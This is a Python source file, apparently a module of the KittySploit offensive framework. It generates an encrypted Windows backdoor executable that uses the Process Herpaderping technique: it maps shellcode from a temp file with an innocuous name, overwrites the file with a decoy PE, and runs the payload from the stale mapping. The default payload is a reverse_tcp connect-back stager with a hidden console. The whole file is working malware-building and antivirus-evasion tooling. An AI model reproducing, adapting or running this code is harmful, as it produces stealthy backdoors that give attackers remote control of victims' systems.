#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Process Herpaderping-style evasion loader.

Writes shellcode to a temp file, creates a section mapping, overwrites the
on-disk file with a benign PE decoy, then executes from the mapped view.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_c_backdoor, option_value
from lib.compile.herpaderping import HerpaderpingBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Process Herpaderping Evasion",
        "description": (
            "Generate a Windows x64 EXE that maps shellcode via a file section, "
            "overwrites the on-disk file with decoy content (Herpaderping), "
            "and executes from the stale mapped view."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1055/",
            "https://github.com/jxy-s/herpaderping",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    temp_filename = OptString("ks_update.bin", "Temp filename under %TEMP%", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(5000, "Sleep milliseconds before executing mapped shellcode", False)
    output_name = OptString("herpaderping.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = HerpaderpingBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_c_backdoor(
            self,
            builder,
            build_source_kwargs={"temp_filename": str(option_value(self, "temp_filename") or "ks_update.bin")},
            output_name="herpaderping.exe",
            save_source_name="herpaderping.c",
        )
        if ok:
            print_info(
                f"Temp file: {option_value(self, 'temp_filename')} | "
                f"Cipher: {option_value(self, 'cipher')} | Sleep: {option_value(self, 'sleep')} ms"
            )
        return ok
